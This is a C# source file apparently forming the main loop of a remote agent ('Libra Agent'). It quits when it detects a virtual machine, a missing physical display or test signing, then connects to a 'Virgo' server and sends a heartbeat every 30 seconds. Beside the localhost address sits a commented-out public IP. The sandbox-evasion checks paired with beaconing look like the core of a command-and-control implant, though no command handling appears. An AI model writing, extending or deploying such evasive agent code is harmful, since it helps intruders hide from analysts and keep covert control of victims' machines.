using Libra.Agent;
using Libra.Agent.Helper;
using Libra.Virgo.Enum;
using Libra.Virgo.Models.MessageType;
using System.Diagnostics;
using System.Threading;

if(!VirtualCheck.HasPhysicalDisplay() ||
    VirtualCheck.IsVirtualMachine() ||
    VirtualCheck.IsTestSigningEnabled())
{
    Console.WriteLine("虚拟机设备");
    return;
}

Console.WriteLine("#Debug Libra Agent 启动中...");
Console.WriteLine("#Debug =====================");

try
{
    string serverIp = "127.0.0.1";//116.62.22.115
    int serverPort = 8888;
    string token = "{AuthToken}";

    Console.WriteLine($"#Debug Agent ID: {Runtimes.AgentId}");
    Console.WriteLine($"#Debug 服务器 IP: {serverIp}:{serverPort}");

    // 创建取消令牌
    using var cts = new CancellationTokenSource();
    Console.CancelKeyPress += (sender, e) =>
    {
        Console.WriteLine("#Debug 正在关闭...");
        cts.Cancel();
        e.Cancel = true;
    };

    // 初始化连接
    Console.WriteLine("#Debug 初始化Virgo连接...");
    try
    {
        await Runtimes.Initialize(serverIp, serverPort);

        var random = new Random();
        while (!cts.Token.IsCancellationRequested)
        {
            try
            {
                // 检查连接状态
                await Runtimes.CheckConnectionStatus();
                
                // 发送心跳
                await Runtimes.SendMessage(VirgoMessageType.Heartbeat, new HeartbeatMessage { Status = "alive", Timestamp = DateTimeOffset.UtcNow.ToUnixTimeSeconds() });
                Console.WriteLine($"#Debug [{DateTime.Now:HH:mm:ss}]已发送心跳");

                await Task.Delay(30000, cts.Token);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"#Debug 主循环出错: {ex.Message}");
                await Task.Delay(60000, cts.Token);
            }
        }
    }
    catch (Exception ex)
    {
        Console.WriteLine($"#Debug 连接失败: {ex.Message}");
    }
}
catch (Exception ex)
{
    Console.WriteLine($"#Debug 错误: {ex.Message}");
    Console.WriteLine($"#Debug 堆栈跟踪: {ex.StackTrace}");
}
finally
{
    Console.WriteLine("#Debug Agent 已停止。");
    Console.WriteLine("#Debug 按任意键退出...");
}

